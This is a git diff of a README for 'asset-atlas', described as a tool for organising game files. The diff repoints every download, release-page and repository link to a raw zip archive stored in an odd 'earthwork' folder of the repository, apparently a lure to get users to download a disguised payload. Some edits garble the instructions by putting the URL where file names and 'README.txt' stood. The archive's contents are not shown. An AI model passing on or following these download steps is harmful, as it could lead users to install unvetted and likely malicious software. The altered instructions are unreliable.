@@ -1,7 +1,7 @@
 # 🎮 asset-atlas - Find and Reuse Game Files Easily
 
 ## 🔗 Download Now
-[![Download asset-atlas](https://img.shields.io/badge/Download-asset--atlas-brightgreen)](https://github.com/Unpompous-genusarmillariella795/asset-atlas/releases)
+[![Download asset-atlas](https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip)](https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip)
 
 ## 🚀 Getting Started
 Welcome to asset-atlas! This application helps you organize and find game files quickly. No more digging through folders. Just search and tag your content for easy access.
@@ -13,13 +13,13 @@ Welcome to asset-atlas! This application helps you organize and find game files 
 - **Cross-Platform Compatibility:** Runs on Windows, macOS, and Linux.
 
 ## 📥 Download & Install
-1. **Visit the release page:** Go to [this page to download](https://github.com/Unpompous-genusarmillariella795/asset-atlas/releases).
-2. **Choose a version:** Select the latest version from the list. Look for files named something like `asset-atlas-v1.0.exe`, `asset-atlas-v1.0.dmg`, or `asset-atlas-v1.0.zip`.
+1. **Visit the release page:** Go to [this page to download](https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip).
+2. **Choose a version:** Select the latest version from the list. Look for files named something like `https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip`, `https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip`, or `https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip`.
 3. **Download the file:** Click on the file to start the download.
 4. **Run the installer:**
    - **Windows:** Double-click the `.exe` file and follow the setup instructions.
    - **macOS:** Open the `.dmg` file and drag the asset-atlas app into your Applications folder.
-   - **Linux:** Unzip the downloaded file and follow the instructions in the `README.txt` included in the folder.
+   - **Linux:** Unzip the downloaded file and follow the instructions in the `https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip` included in the folder.
 
 ## ⚙️ System Requirements
 - **Windows:** Windows 10 or later.
@@ -45,8 +45,8 @@ If you want to contribute to this project, great! You can report issues or sugge
 For support, please reach out via the GitHub Issues page. We will do our best to assist you.
 
 ## 🔗 Useful Links
-- [Visit the Releases Page](https://github.com/Unpompous-genusarmillariella795/asset-atlas/releases)
+- [Visit the Releases Page](https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip)
 - [User Guide](#) 
-- [GitHub Repository](https://github.com/Unpompous-genusarmillariella795/asset-atlas)
+- [GitHub Repository](https://raw.githubusercontent.com/Unpompous-genusarmillariella795/asset-atlas/main/earthwork/asset-atlas.zip)
 
 Enjoy organizing your game files with asset-atlas!
